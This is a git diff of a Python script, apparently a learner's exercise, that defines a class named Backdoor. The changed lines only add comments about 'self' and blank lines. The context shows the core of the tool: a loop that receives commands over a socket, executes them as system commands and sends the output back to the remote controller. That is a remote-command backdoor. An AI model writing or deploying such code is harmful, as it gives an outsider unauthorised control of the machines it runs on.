@@ -18,7 +18,8 @@ class Backdoor:
     def run(self):
         while True:
             command = self.connection.recv(1024) #receive, specify buffer size
-            command_result = self.execute_system_command(command)
+            command_result = self.execute_system_command(command) #specify SELF.function -
+            #need to specify self since calling function from within class
             self.connection.send(command_result)
         connection.close()
     
@@ -28,6 +29,10 @@ buffer_size = int(raw_input("Enter buffer size: "))
 
 my_backdoor = Backdoor(ip, port)
 my_backdoor.run()
+
+
+
+
 
 #connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
 ############################################################################
